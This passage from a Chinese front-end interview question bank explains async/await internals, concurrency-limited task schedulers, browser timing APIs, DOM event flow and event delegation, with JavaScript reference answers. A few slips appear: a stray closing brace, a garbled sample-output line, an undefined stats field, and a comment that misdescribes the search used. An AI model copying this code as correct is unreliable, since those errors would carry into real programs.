- **知识点**：async/await、Generator、并发控制
- **题型**：编程实践题

### 参考答案要点：

#### 1. async/await 的本质

`async/await` 是 **Generator 函数 + 自动执行器**的语法糖：

```javascript
// async/await 版本
async function fetchData() {
  const res1 = await fetch('/api/user');
  const user = await res1.json();
  const res2 = await fetch(`/api/posts/${user.id}`);
  const posts = await res2.json();
  return posts;
}

// 等价的 Generator + 自动执行器版本
function* genFetchData() {
  const res1 = yield fetch('/api/user');
  const user = yield res1.json();
  const res2 = yield fetch(`/api/posts/${user.id}`);
  const posts = yield res2.json();
  return posts;
}

// 自动执行器
function runAsync(generatorFn) {
  const gen = generatorFn();

  function step(result) {
    if (result.done) return result.value;  // Generator 完成

    const promise = result.value;  // yield 出来的通常是 Promise
    return promise.then(
      (value) => step(gen.next(value)),   // 将 value 传回 Generator
      (error) => step(gen.throw(error))   // 将错误抛回 Generator
    );
  }

  return step(gen.next());  // 启动 Generator
}

runAsync(genFetchData);  // 与 async fetchData() 行为一致
```

#### 2. 并发调度器（限制并发数）

```javascript
/**
 * 并发调度器：限制同时运行的异步任务数量
 * @param {number} concurrency - 最大并发数
 */
class Scheduler {
  constructor(concurrency) {
    this.concurrency = concurrency;  // 最大并发数
    this.running = 0;                // 当前运行数
    this.queue = [];                 // 等待队列
  }

  add(promiseFactory) {
    // promiseFactory 是一个返回 Promise 的函数（延迟执行）
    return new Promise((resolve, reject) => {
      this.queue.push({
        promiseFactory,
        resolve,
        reject
      });
      this.tryRunNext();  // 尝试执行下一个任务
    });
  }

  tryRunNext() {
    // 还有空闲位置 且 还有等待中的任务
    while (this.running < this.concurrency && this.queue.length > 0) {
      const task = this.queue.shift();
      this.running++;

      task.promiseFactory()
        .then(task.resolve)    // 任务成功 → resolve 外部 Promise
        .catch(task.reject)    // 任务失败 → reject 外部 Promise
        .finally(() => {
          this.running--;      // 任务结束，释放一个位置
          this.tryRunNext();   // 尝试执行下一个排队任务
        });
    }
  }
}

// 使用示例
const scheduler = new Scheduler(2);  // 最多同时 2 个任务

// 模拟异步任务（带延迟）
function createTask(id, delay) {
  return () => new Promise((resolve) => {
    console.log(`任务 ${id} 开始`);
    setTimeout(() => {
      console.log(`任务 ${id} 完成`);
      resolve(id);
    }, delay);
  });
}

scheduler.add(createTask(1, 1000)).then(console.log);  // 任务1 立即开始
scheduler.add(createTask(2, 500)).then(console.log);   // 任务2 立即开始
scheduler.add(createTask(3, 300)).then(console.log);   // 任务3 排队（前两个占满）
scheduler.add(createTask(4, 200)).then(console.log);   // 任务4 排队

// 输出示例：
// 任务 1 开始
// 任务 2 开始
// 任务 2 完成（500ms 后）→ 任务 3 开始
// 任务 4 完成（700ms 后）→ 任务 4 开始
// 任务 3 完成（800ms 后）
// 任务 1 完成（1000ms 后）→ ...
```

#### 3. 高级版：支持优先级的调度器

```javascript
class PriorityScheduler extends Scheduler {
  add(promiseFactory, priority = 0) {
    return new Promise((resolve, reject) => {
      const task = { promiseFactory, resolve, reject, priority };
      // 按优先级插入（priority 越小越优先）
      const insertIndex = this.queue.findIndex(
        (t) => t.priority > priority
      );
      if (insertIndex === -1) {
        this.queue.push(task);
      } else {
        this.queue.splice(insertIndex, 0, task);
      }
      this.tryRunNext();
    });
  }
  }
}
```

### 深度拓展：手写实现

#### 手写完整版 ConcurrencyPool - 支持高级功能的并发调度器

```javascript
/**
 * 并发控制池（ConcurrencyPool）- 完整版
 * 
 * 功能特性：
 * 1. 限制同时运行的异步任务数量
 * 2. 任务完成/失败后自动从队列取下一个执行
 * 3. 支持 Promise.allSettled 等待所有任务完成
 * 4. 支持动态调整 maxConcurrency（运行时修改）
 * 5. 支持暂停/恢复（pause/resume）
 * 6. 支持清空队列（clear - 取消等待中的任务）
 * 7. 支持优先级队列（priority 参数）
 * 8. 支持任务超时控制（timeout 参数）
 * 9. 支持事件回调（onStart/onComplete/onError/onAllComplete）
 * 
 * @param {number} maxConcurrency - 最大并发数（必须 >= 1）
 */
class ConcurrencyPool {
  constructor(maxConcurrency = 3) {
    // ==================== 基础配置 ====================
    
    if (maxConcurrency < 1) {
      throw new RangeError('maxConcurrency must be at least 1');
    }
    
    this._maxConcurrency = maxConcurrency;  // 最大并发数（可动态调整）
    this._runningCount = 0;                  // 当前正在运行的任务数
    this._queue = [];                        // 等待队列（按优先级排序）
    
    // ==================== 状态管理 ====================
    
    this._paused = false;                    // 是否暂停
    this._cleared = false;                   // 是否已被清空
    
    // ==================== 统计信息 ====================
    
    this._stats = {
      total: 0,        // 总任务数（包括已完成、失败、等待中的）
      completed: 0,    // 已完成任务数
      failed: 0,       // 失败任务数
      pending: 0,      // 等待中任务数
    };
    
    // ==================== 事件回调 ====================
    
    this._callbacks = {
      onStart: null,         // 任务开始执行时触发
      onComplete: null,      // 任务成功完成时触发
      onError: null,         // 任务失败时触发
      onAllComplete: null,   // 所有任务完成时触发
      onDrain: null,         // 队列清空且没有正在运行的任务时触发
    };
    
    // ==================== Promise 管理 ====================
    
    // 用于 allSettled 的 Promise 集合
    this._taskPromises = [];
    this._allSettledResolve = null;
    this._allSettledReject = null;
    this._allSettledPromise = null;
  }

  // ==================== 核心方法：添加任务 ====================
  
  /**
   * 添加一个异步任务到池中
   * @param {Function} taskFactory - 返回 Promise 的工厂函数（延迟执行模式）
   * @param {Object} [options] - 可选配置
   * @param {number} [options.priority=0] - 优先级（数字越小越优先）
   * @param {number} [options.timeout] - 超时时间（毫秒），超时后自动 reject
   * @param {string} [options.name] - 任务名称（用于日志和调试）
   * @returns {Promise} 任务对应的 Promise（可用于 await 或 .then/.catch）
   */
  addTask(taskFactory, options = {}) {
    const {
      priority = 0,
      timeout,
      name = `task-${this._stats.total + 1}`,
    } = options;

    // 更新统计
    this._stats.total++;
    this._stats.pending++;

    // 创建外部 Promise（返回给调用者）
    // 这个 Promise 的状态会与实际任务的执行结果同步
    const taskPromise = new Promise((resolve, reject) => {
      // 构建任务对象
      const task = {
        taskFactory,       // 工厂函数（调用后返回 Promise）
        resolve,           // 外部 Promise 的 resolve
        reject,            // 外部 Promise 的 reject
        priority,          // 优先级
        timeout,           // 超时时间
        name,              // 任务名称
        addedAt: Date.now(),// 添加时间
        startedAt: null,   // 开始执行时间
        status: 'pending', // 状态：pending | running | completed | failed | timeout | cancelled
      };

      // ==================== 插入到队列（按优先级排序）====================
      
      // 使用二分查找找到合适的插入位置（保持队列有序）
      // 这样每次取任务时直接取队首即可（O(1) 操作）
      
      let insertIndex = this._queue.length;
      
      for (let i = 0; i < this._queue.length; i++) {
        if (this._queue[i].priority > priority) {
          insertIndex = i;
          break;
        }
      }
      
      this._queue.splice(insertIndex, 0, task);
    });

    // 收集所有任务的 Promise（用于 allSettled）
    this._taskPromises.push({
      promise: taskPromise,
      name: options.name || `task-${this._stats.total}`,
    });

    // 尝试立即执行（如果有空闲位置且未暂停）
    this._tryRunNext();

    return taskPromise;
  }

  // ==================== 内部调度逻辑 ====================
  
  /**
   * 尝试执行队列中的下一个任务
   * 私有方法，内部调用
   * @private
   */
  _tryRunNext() {
    // 如果已清空或已暂停，不执行新任务
    if (this._cleared || this._paused) {
      return;
    }

    // 循环处理：只要还有空闲位置 且 还有等待中的任务，就继续执行
    while (
      this._runningCount < this._maxConcurrency &&  // 有空闲位置
      this._queue.length > 0 &&                     // 还有等待的任务
      !this._paused &&                              // 未暂停
      !this._cleared                                // 未清空
    ) {
      // 取出队首任务（优先级最高的）
      const task = this._queue.shift();
      
      // 更新统计
      this._stats.pending--;
      this._stats.running++;  // 注意：这是临时统计，下面会修正

      // 执行任务
      this._executeTask(task);
    }

    // 检查是否所有任务都完成了（队列为空且没有运行中的任务）
    this._checkIfDrained();
  }

  /**
   * 执行单个任务
   * @param {Object} task - 任务对象
   * @private
   */
  _executeTask(task) {
    // 标记任务开始
    task.status = 'running';
    task.startedAt = Date.now();
    this._runningCount++;

    // 触发 onStart 回调
    this._emit('onStart', {
      name: task.name,
      runningCount: this._runningCount,
      queueLength: this._queue.length,
    });

    // 创建超时控制器（如果设置了 timeout）
    let timeoutId = null;
    if (task.timeout && task.timeout > 0) {
      timeoutId = setTimeout(() => {
        // 超时处理
        task.status = 'timeout';
        this._runningCount--;
        this._stats.failed++;
        
        const error = new Error(`Task "${task.name}" timed out after ${task.timeout}ms`);
        error.code = 'TIMEOUT';
        
        task.reject(error);  // reject 外部 Promise
        
        // 触发 onError 回调
        this._emit('onError', {
          name: task.name,
          error,
          type: 'timeout',
        });
        
        // 尝试执行下一个任务
        this._tryRunNext();
      }, task.timeout);
    }

    // 执行实际的异步任务
    try {
      const resultPromise = task.taskFactory();  // 调用工厂函数获取 Promise
      
      // 处理任务完成
      resultPromise
        .then((result) => {
          // 清除超时定时器
          if (timeoutId !== null) {
            clearTimeout(timeoutId);
          }

          // 如果任务已经被标记为超时或取消，不再处理成功结果
          if (task.status === 'timeout' || task.status === 'cancelled') {
            return;
          }

          // 标记任务完成
          task.status = 'completed';
          this._runningCount--;
          this._stats.completed++;

          // resolve 外部 Promise
          task.resolve(result);

          // 触发 onComplete 回调
          this._emit('onComplete', {
            name: task.name,
            result,
            duration: Date.now() - task.startedAt,
          });
          
          // 尝试执行下一个任务
          this._tryRunNext();
        })
        .catch((error) => {
          // 清除超时定时器
          if (timeoutId !== null) {
            clearTimeout(timeoutId);
          }

          // 如果任务已经被标记为超时或取消，不再处理错误
          if (task.status === 'timeout' || task.status === 'cancelled') {
            return;
          }

          // 标记任务失败
          task.status = 'failed';
          this._runningCount--;
          this._stats.failed++;

          // reject 外部 Promise
          task.reject(error);

          // 触发 onError 回调
          this._emit('onError', {
            name: task.name,
            error,
            type: 'error',
          });
          
          // 尝试执行下一个任务
          this._tryRunNext();
        });
    } catch (syncError) {
      // 工厂函数本身抛出同步错误（不是返回 rejected Promise）
      if (timeoutId !== null) {
        clearTimeout(timeoutId);
      }

      task.status = 'failed';
      this._runningCount--;
      this._stats.failed++;

      task.reject(syncError);

      this._emit('onError', {
        name: task.name,
        error: syncError,
        type: 'sync-error',
      });
      
      this._tryRunNext();
    }
  }

  // ==================== 控制方法 ====================
  
  /**
   * 动态调整最大并发数
   * @param {number} newMax - 新的最大并发数（必须 >= 1）
   */
  setMaxConcurrency(newMax) {
    if (newMax < 1) {
      throw new RangeError('maxConcurrency must be at least 1');
    }
    
    const oldMax = this._maxConcurrency;
    this._maxConcurrency = newMax;
    
    console.log(
      `[ConcurrencyPool] 并发数从 ${oldMax} 调整为 ${newMax}` +
      `(当前运行: ${this._runningCount}, 等待: ${this._queue.length})`
    );
    
    // 如果增大了并发数，可能可以立即执行更多任务
    if (newMax > oldMax) {
      this._tryRunNext();
    }
  }

  /**
   * 暂停调度（不影响当前正在运行的任务）
   */
  pause() {
    if (this._paused) {
      console.warn('[ConcurrencyPool] 已经处于暂停状态');
      return;
    }
    
    this._paused = true;
    console.log(`[ConcurrencyPool] 已暂停 (运行中: ${this._runningCount}, 等待: ${this._queue.length})`);
  }

  /**
   * 恢复调度
   */
  resume() {
    if (!this._paused) {
      console.warn('[ConcurrencyPool] 未处于暂停状态');
      return;
    }
    
    this._paused = false;
    console.log('[ConcurrencyPool] 已恢复');
    
    // 恢复后尝试执行排队的任务
    this._tryRunNext();
  }

  /**
   * 清空等待队列（取消所有未执行的任务）
   * 当前正在运行的任务不受影响
   * @returns {number} 被取消的任务数量
   */
  clearQueue() {
    const cancelledCount = this._queue.length;
    
    // 将队列中的所有任务标记为 cancelled 并 reject
    while (this._queue.length > 0) {
      const task = this._queue.shift();
      task.status = 'cancelled';
      task.reject(new Error('Task cancelled (queue cleared)'));
      this._stats.pending--;
      this._stats.failed++;  // 计入失败统计
    }
    
    this._cleared = true;  // 标记为已清空（防止新任务被执行）
    
    console.log(`[ConcurrencyPool] 已清空队列，取消了 ${cancelledCount} 个任务`);
    
    // 检查是否所有任务都完成了
    this._checkIfDrained();
    
    return cancelledCount;
  }

  // ==================== 查询方法 ====================
  
  /**
   * 获取当前状态
   * @returns {Object} 状态对象
   */
  getStatus() {
    return {
      maxConcurrency: this._maxConcurrency,
      runningCount: this._runningCount,
      queueLength: this._queue.length,
      paused: this._paused,
      cleared: this._cleared,
      stats: { ...this._stats },
    };
  }

  /**
   * 等待所有任务完成（包括等待中和运行中的）
   * @returns {Promise<Array>} 所有任务的结果数组（类似 Promise.allSettled 的格式）
   */
  async allSettled() {
    // 如果已经有未完成的 allSettled Promise，返回它
    if (this._allSettledPromise && !this._isAllComplete()) {
      return this._allSettledPromise;
    }

    // 创建新的 allSettled Promise
    this._allSettledPromise = new Promise((resolve, reject) => {
      this._allSettledResolve = resolve;
      this._allSettledReject = reject;
    });

    // 如果已经全部完成，立即 resolve
    if (this._isAllComplete()) {
      this._resolveAllSettled();
    }

    return this._allSettledPromise;
  }

  // ==================== 事件系统 ====================
  
  /**
   * 注册事件回调
   * @param {string} event - 事件名称
   * @param {Function} callback - 回调函数
   */
  on(event, callback) {
    if (!this._callbacks.hasOwnProperty(event)) {
      console.warn(`[ConcurrencyPool] Unknown event: ${event}`);
      return this;
    }
    
    this._callbacks[event] = callback;
    return this;  // 支持链式调用
  }

  // ==================== 私有辅助方法 ====================
  
  /**
   * 检查是否所有任务都已完成
   * @private
   */
  _isAllComplete() {
    return this._runningCount === 0 && this._queue.length === 0;
  }

  /**
   * 检查并触发 drain / allComplete 事件
   * @private
   */
  _checkIfDrained() {
    if (this._isAllComplete()) {
      // 触发 onDrain 事件
      this._emit('onDrain', {
        stats: { ...this._stats },
      });
      
      // 触发 onAllComplete 事件
      this._emit('onAllComplete', {
        stats: { ...this._stats },
      });
      
      // 如果有挂起的 allSettled Promise，resolve 它
      if (this._allSettledResolve) {
        this._resolveAllSettled();
      }
    }
  }

  /**
   * resolve allSettled Promise
   * @private
   */
  async _resolveAllSettled() {
    if (!this._allSettledResolve) return;
    
    // 等待所有任务 Promise 完成
    const results = await Promise.allSettled(
      this._taskPromises.map(tp => tp.promise)
    );
    
    // 包装为更详细的格式
    const detailedResults = results.map((result, index) => ({
      name: this._taskPromises[index].name,
      status: result.status,
      value: result.value,
      reason: result.reason,
    }));
    
    this._allSettledResolve(detailedResults);
    this._allSettledResolve = null;
    this._allSettledReject = null;
  }

  /**
   * 触发事件
   * @param {string} event - 事件名称
   * @param {*} data - 事件数据
   * @private
   */
  _emit(event, data) {
    const callback = this._callbacks[event];
    if (typeof callback === 'function') {
      try {
        callback(data);
      } catch (error) {
        console.error(`[ConcurrencyPool] Error in ${event} callback:`, error);
      }
    }
  }
}

// ==================== 使用示例 ====================

async function demonstrateConcurrencyPool() {
  console.log('\n========== ConcurrencyPool 完整功能演示 ==========\n');

  // 创建并发池（最大并发数为 2）
  const pool = new ConcurrencyPool(2);

  // 注册事件回调
  pool.on('onStart', ({ name, runningCount, queueLength }) => {
    console.log(`🚀 [${name}] 开始执行 (运行: ${runningCount}, 等待: ${queueLength})`);
  });

  pool.on('onComplete', ({ name, result, duration }) => {
    console.log(`✅ [${name}] 完成 (${duration}ms) → 结果: ${result}`);
  });

  pool.on('onError', ({ name, error, type }) => {
    console.log(`❌ [${name}] ${type}: ${error.message}`);
  });

  pool.on('onDrain', ({ stats }) => {
    console.log(`\n🎉 所有任务完成！统计:`, stats);
  });

  // 创建模拟异步任务的工具函数
  function createTask(id, delay, shouldFail = false) {
    return () => new Promise((resolve, reject) => {
      setTimeout(() => {
        if (shouldFail) {
          reject(new Error(`Task ${id} intentionally failed`));
        } else {
          resolve(`Result-${id}`);
        }
      }, delay);
    });
  }

  // ==================== 测试1：基本并发控制 ====================
  console.log('--- 测试1：基本并发控制 ---\n');

  // 添加 5 个任务（但最多同时运行 2 个）
  const task1 = pool.addTask(createTask(1, 1000), { name: 'Task-1', priority: 1 });
  const task2 = pool.addTask(createTask(2, 500), { name: 'Task-2', priority: 0 });  // 高优先级
  const task3 = pool.addTask(createTask(3, 800), { name: 'Task-3', priority: 2 });
  const task4 = pool.addTask(createTask(4, 300), { name: 'Task-4', priority: 1 });
  const task5 = pool.addTask(createTask(5, 600), { name: 'Task-5', priority: 0 });  // 高优先级

  // 等待所有任务完成
  const results = await pool.allSettled();
  console.log('\n📊 allSettled 结果:', results.filter(r => r.status === 'fulfilled').length, '个成功');

  // ==================== 测试2：动态调整并发数 ====================
  console.log('\n--- 测试2：动态调整并发数 ---\n');

  const pool2 = new ConcurrencyPool(1);  // 初始并发数为 1
  
  pool2.addTask(createTask('A', 500), { name: 'Slow-A' });
  pool2.addTask(createTask('B', 300), { name: 'Fast-B' });
  pool2.addTask(createTask('C', 200), { name: 'Fast-C' });
  
  // 200ms 后将并发数调整为 3（让剩余任务并行执行）
  setTimeout(() => {
    console.log('⬆️  动态提升并发数至 3...');
    pool2.setMaxConcurrency(3);
  }, 200);

  await pool2.allSettled();

  // ==================== 测试3：暂停与恢复 ====================
  console.log('\n--- 测试3：暂停与恢复 ---\n');

  const pool3 = new ConcurrencyPool(2);
  
  pool3.addTask(createTask('X', 400), { name: 'Task-X' });
  pool3.addTask(createTask('Y', 400), { name: 'Task-Y' });
  pool3.addTask(createTask('Z', 300), { name: 'Task-Z' });  // 这个会被排队
  
  // 200ms 后暂停
  setTimeout(() => {
    console.log('⏸️  暂停调度...');
    pool3.pause();
    
    // 600ms 后恢复
    setTimeout(() => {
      console.log('▶️  恢复调度...');
      pool3.resume();
    }, 600);
  }, 200);

  await pool3.allSettled();

  // ==================== 测试4：超时控制 ====================
  console.log('\n--- 测试4：超时控制 ---\n');

  const pool4 = new ConcurrencyPool(2);
  
  // 正常完成的任务
  pool4.addTask(createTask('Fast', 200), { name: 'Fast-Task' });
  
  // 会超时的任务（需要 2000ms，但只给 500ms）
  pool4.addTask(() => new Promise(resolve => setTimeout(resolve, 2000)), {
    name: 'Slow-Task',
    timeout: 500,  // 500ms 超时
  });

  try {
    await pool4.allSettled();
  } catch (e) {
    // 忽略超时错误（我们已经在 onError 中记录了）
  }

  // ==================== 测试5：清空队列 ====================
  console.log('\n--- 测试5：清空队列 ---\n');

  const pool5 = new ConcurrencyPool(1);
  
  // 第一个任务正常执行
  pool5.addTask(createTask('Keep', 300), { name: 'Keep-This' });
  
  // 后续任务会被取消
  pool5.addTask(createTask('Cancel1', 1000), { name: 'Cancel-1' });
  pool5.addTask(createTask('Cancel2', 1000), { name: 'Cancel-2' });
  pool5.addTask(createTask('Cancel3', 1000), { name: 'Cancel-3' });
  
  // 100ms 后清空队列（第一个任务已经开始执行，不会被取消）
  setTimeout(() => {
    console.log('🗑️  清空队列...');
    const cancelled = pool5.clearQueue();
    console.log(`取消了 ${cancelled} 个等待中的任务`);
  }, 100);

  await pool5.allSettled();

  // ==================== 最终统计 ====================
  console.log('\n========== 演示结束 ==========');
}

// 运行演示
demonstrateConcurrencyPool().catch(console.error);
```

**核心 API 总结**：

| 方法/属性 | 类型 | 说明 |
|:---|:---|:---|
| `addTask(factory, options)` | 方法 | 添加任务（支持优先级、超时、命名） |
| `setMaxConcurrency(n)` | 方法 | 动态调整最大并发数 |
| `pause()` / `resume()` | 方法 | 暂停/恢复调度 |
| `clearQueue()` | 方法 | 清空等待队列 |
| `allSettled()` | 方法 | 等待所有任务完成 |
| `getStatus()` | 方法 | 获取当前状态和统计信息 |
| `on(event, cb)` | 方法 | 注册事件回调 |

---

## Q31: 请对比 `setTimeout`、`requestAnimationFrame` 和 `requestIdleCallback` 三种定时/调度 API，说明各自的特点和使用场景。
- **难度**：★★☆
- **知识点**：定时器、rAF、rIC、渲染性能
- **题型**：简答题

### 参考答案要点：

#### 1. 三种 API 对比

| 特性 | setTimeout | requestAnimationFrame (rAF) | requestIdleCallback (rIC) |
|:---|:---|:---|:---|
| **精度** | 最低 4ms（浏览器限制） | 与屏幕刷新率同步（通常 16.67ms/60fps） | 在帧空闲时执行 |
| **最小延迟** | 0 ≈ 4ms（HTML5 规范） | ≈ 16.67ms（60fps 屏幕） | 无保证（可能永远不执行） |
| **执行时机** | 下一轮宏任务 | **下一帧渲染前** | **浏览器空闲时段** |
| **节流效果** | 无 | **自带节流**（每帧最多一次） | 无 |
| **页面后台** | 仍然执行（最低 1000ms） | **暂停执行** | 通常不执行 |
| **取消** | `clearTimeout(timer)` | `cancelAnimationFrame(id)` | `cancelIdleCallback(id)` |
| **主要用途** | 延迟执行、轮询 | **动画**、视觉更新 | **非紧急低优先级任务** |

#### 2. setTimeout 的细节

```javascript
// 最小延迟限制
setTimeout(() => {}, 0);  // 实际延迟约 4ms（Chrome/Firefox）
// HTML5 规定：嵌套超过 5 层的 setTimeout 最小 4ms

// 嵌套延迟增加
function nestedTimeout(depth = 0) {
  if (depth > 10) return;
  setTimeout(() => {
    console.log(`depth ${depth}, delay ≥ ${Math.min(4 + depth, 1000)}ms`);
    nestedTimeout(depth + 1);
  }, 0);
}

// 页面不可见时的行为
// 大多数浏览器将后台 tab 的 setTimeout 限制为最低 1000ms
// 以节省 CPU/电池
```

#### 3. requestAnimationFrame（动画首选）

```javascript
// 基本用法
let startTime = null;

function animate(timestamp) {
  if (!startTime) startTime = timestamp;
  const progress = timestamp - startTime;

  // 动画逻辑
  element.style.transform = `translateX(${Math.min(progress / 10, 200)}px)`;

  if (progress < 2000) {
    requestAnimationFrame(animate);  // 继续下一帧
  }
}

requestAnimationFrame(animate);

// 优势：
// 1. 与浏览器刷新同步，不会掉帧/跳帧
// 2. 页面不可见时自动暂停，节省资源
// 3. CSS/JS 动画在同一帧内同步
// 4. 自适应高刷屏幕（120Hz/144Hz）

// 封装：简化版的 animate
function rafThrottle(fn) {
  let ticking = false;
  return function(...args) {
    if (!ticking) {
      requestAnimationFrame(() => {
        fn.apply(this, args);
        ticking = false;
      });
      ticking = true;
    }
  };
}

const scrollHandler = rafThrottle((e) => {
  // 每帧最多执行一次，即使 scroll 事件高频触发
  console.log('scroll position:', window.scrollY);
});
window.addEventListener('scroll', scrollHandler);
```

#### 4. requestIdleCallback（空闲时执行低优先级任务）

```javascript
// 基本用法
function processIdle(deadline) {
  // deadline.timeRemaining() — 当前帧剩余时间（ms）
  // deadline.didTimeout — 是否超时

  while (deadline.timeRemaining() > 0 || deadline.didTimeout) {
    // 执行小块工作
    processChunk();
  }

  // 如果还有未完成的任务，注册下一次空闲回调
  if (hasMoreWork()) {
    requestIdleCallback(processIdle, { timeout: 2000 });
  }
}

requestIdleCallback(processIdle, { timeout: 2000 });
// timeout：即使浏览器很忙，最多等 2s 也强制执行

// 实际应用场景：
// 1. 发送 analytics 数据（非紧急）
// 2. 预加载资源（预取下一页数据）
// 3. React 18 的 time slicing（时间切片）
// 4. 懒计算/懒解析

// ⚠️ 注意：rIC 兼容性较差，React 自己实现了 scheduler polyfill
// 生产环境中通常需要 polyfill 或使用 MessageChannel 模拟
```

#### 5. 选择指南

```javascript
// 需要精确延迟 → setTimeout
setTimeout(() => showToast('操作成功'), 2000);

// 动画 / 视觉更新 → requestAnimationFrame
requestAnimationFrame(renderFrame);

// 低优先级后台任务 → requestIdleCallback
requestIdleCallback(sendAnalytics);

// 高频事件节流 → requestAnimationFrame
window.addEventListener('resize', rafThrottle(handleResize));

// 轮询 / 心跳检测 → setInterval
setInterval(checkHealth, 5000);
```

---

## Q32: 请详细说明 DOM 事件流的三个阶段，以及 `addEventListener` 第三个参数的完整含义（capture、passive、once）。
- **难度**：★★☆
- **知识点**：DOM 事件、事件流、addEventListener
- **题型**：简答题

### 参考答案要点：

#### 1. 事件流三阶段

```
                    │  Window  │
                    │ Document │
                    │  <html>  │
                    │  <body>  │
                    │  <div>   │  ← 点击目标
                    │  ─────── │
    ════════════════╪══════════╪════════════════
         ↓ 捕获阶段 ↓          ↓ 冒泡阶段 ↓
    (从外到内)                (从内到外)

    1. Capture（捕获）：Window → Document → html → body → div（目标）
    2. Target（目标阶段）：到达目标元素 div
    3. Bubble（冒泡）：div → body → html → Document → Window
```

```html
<div id="grandpa">
  <div id="parent">
    <div id="child">点击我</div>
  </div>
</div>
<script>
const grandpa = document.getElementById('grandpa');
const parent = document.getElementById('parent');
const child = document.getElementById('child');

// 捕获阶段监听（第三个参数为 true）
grandpa.addEventListener('click', () => console.log('grandpa 捕获'), true);
parent.addEventListener('click', () => console.log('parent 捕获'), true);
child.addEventListener('click', () => console.log('child 目标')); // 目标阶段

// 冒泡阶段监听（第三个参数为 false/省略）
grandpa.addEventListener('click', () => console.log('grandpa 冒泡'));
parent.addEventListener('click', () => console.log('parent 冒泡'));
child.addEventListener('click', () => console.log('child 冒泡'));

// 点击 child 时的输出顺序：
// grandpa 捕获 → parent 捕获 → child 目标 → child 冒泡 → parent 冒泡 → grandpa 冒泡
</script>
```

#### 2. addEventListener 第三个参数详解

```javascript
// 旧写法（布尔值）
element.addEventListener(type, handler, useCapture);  // true=捕获, false=冒泡

// 新写法（选项对象，推荐）
element.addEventListener(type, handler, options);

options = {
  capture: false,  // 是否在捕获阶段触发（默认 false = 冒泡阶段）
  once: false,     // 是否只触发一次（触发后自动移除）（默认 false）
  passive: false   // 是否为被动监听器（默认 false）
};
```

##### capture（捕获）

```javascript
// 在捕获阶段触发（而不是默认的冒泡阶段）
document.addEventListener('click', handler, { capture: true });
// 等价于旧写法：document.addEventListener('click', handler, true);
```

##### once（一次性）

```javascript
// 监听器只触发一次，然后自动移除
button.addEventListener('click', () => {
  console.log('只会出现一次');
}, { once: true });
// 等价于：
// button.addEventListener('click', function handler() {
//   console.log('只会出现一次');
//   button.removeEventListener('click', handler);
// });
```

##### passive（被动监听器）— **性能优化重点**

```javascript
// passive: true 告诉浏览器：这个监听器永远不会调用 preventDefault()
// 这样浏览器可以在主线程之外（如合成线程）优化滚动/触摸行为
// 大幅提升滚动性能！

// ✅ 推荐：触摸/滚动事件使用 passive
document.addEventListener('touchstart', handler, { passive: true });
document.addEventListener('touchmove', handler, { passive: true });

// ❌ 问题：如果 passive: true 却调用了 preventDefault()，浏览器会忽略
// 且在控制台发出警告（Chrome 会报错）

// 默认值：touchstart/touchmove 在 document 级别默认 passive: true（Chrome 56+）
// 所以 document.addEventListener('touchmove', e => e.preventDefault()) 可能无效！
// 解决：显式设置 passive: false

// 检测是否支持 passive
let supportsPassive = false;
try {
  const opts = Object.defineProperty({}, 'passive', {
    get() { supportsPassive = true; }
  });
  window.addEventListener('test', null, opts);
} catch (e) {}

console.log('支持 passive:', supportsPassive);
```

#### 3. 阻止事件传播与默认行为

```javascript
element.addEventListener('click', function(e) {
  // 阻止事件冒泡（不再向上传播）
  e.stopPropagation();

  // 阻止同一元素上的其他同类型监听器（立即停止）
  e.stopImmediatePropagation();

  // 阻止默认行为（如链接跳转、表单提交）
  e.preventDefault();

  // 同时阻止冒泡和默认行为
  return false;  // 仅限 DOM0 级 onXXX 事件处理器中有效
});

// 注意：捕获阶段调用 stopPropagation 可以阻止事件到达目标/冒泡阶段
```

---

## Q33: 什么是事件委托（Event Delegation）？请说明其原理、优势，并手写实现一个通用的事件委托函数。
- **难度**：★★☆
- **知识点**：事件委托、DOM 事件、性能优化
- **题型**：编程实践题

### 参考答案要点：

#### 1. 原理

**事件委托**利用事件的**冒泡机制**，将子元素的事件监听器统一注册到父元素上，通过 `event.target` 判断实际触发的子元素。

```html
<ul id="list">
  <li data-id="1">Item 1</li>
  <li data-id="2">Item 2</li>
  <li data-id="3">Item 3</li>
  <!-- 动态添加的 li 也会被监听 -->
</ul>
<script>
// ❌ 传统方式：每个 li 单独绑定
const items = document.querySelectorAll('#list li');
items.forEach(li => {
  li.addEventListener('click', (e) => console.log(e.target.dataset.id));
});
// 缺点：
// 1. 内存占用大（N 个 li = N 个监听器）
// 2. 新增的 li 不会自动绑定

// ✅ 事件委托方式：只绑定到 ul 上
document.getElementById('list').addEventListener('click', (e) => {
  // 判断点击的是否是 li 元素
  if (e.target.tagName === 'LI') {
    console.log(e.target.dataset.id);
    // 即使是新动态添加的 li，也能响应 ✅
  }
});
</script>
```

#### 2. 事件委托的优势

| 优势 | 说明 |
|:---|:---|
| **节省内存** | N 个子元素只需 1 个监听器 |
| **动态元素友好** | 后续新增的子元素自动可响应 |
| **简化代码** | 不需要循环绑定 |
| **减少内存泄漏风险** | 监听器少，更容易清理 |

#### 3. 手写通用事件委托函数

```javascript
/**
 * 通用事件委托
 * @param {HTMLElement} parent - 父元素
 * @param {string} eventType - 事件类型
 * @param {string} selector - 子元素选择器
 * @param {Function} handler - 事件处理函数
 * @param {Object} options - addEventListener 选项
 */
function delegate(parent, eventType, selector, handler, options = {}) {
  parent.addEventListener(eventType, (e) => {
    // 从 target 向上查找匹配 selector 的最近祖先元素
    const targetElement = e.target.closest(selector);

    // 确保找到的元素在 parent 内部（防止冒泡上来时匹配到外部元素）
    if (targetElement && parent.contains(targetElement)) {
      // 将原始 event 和实际目标元素传给 handler
      handler.call(targetElement, e, targetElement);
    }
  }, options);

  // 返回取消绑定的函数（方便清理）
  return function undelegate() {
    // 注意：这里简化了，实际需要保存引用才能精确移除
    // 生产环境建议使用 EventTarget 的方式管理
  };
}

// 使用示例
const list = document.getElementById('list');

const undelegate = delegate(list, 'click', 'li[data-id]', function(e, el) {
  console.log('点击了:', el.dataset.id);
  this.style.color = 'red';  // this === el
});

// 清理
// undelegate();
```

#### 4. 高级版：支持多事件、防抖等

```javascript
class EventDelegator {
  constructor(rootElement) {
    this.root = rootElement;
    this.handlers = new Map();  // 存储所有委托处理器
  }

  on(eventType, selector, handler, options = {}) {
    const key = `${eventType}::${selector}`;

    if (!this.handlers.has(key)) {
      // 同一 eventType + selector 只绑定一次原生监听器
      const wrappedHandler = (e) => {
        const target = e.target.closest(selector);
        if (target && this.root.contains(target)) {
          // 调用所有注册的 handler
          this.handlers.get(key).forEach(({ fn }) => {
            fn.call(target, e, target);
          });
        }
      };

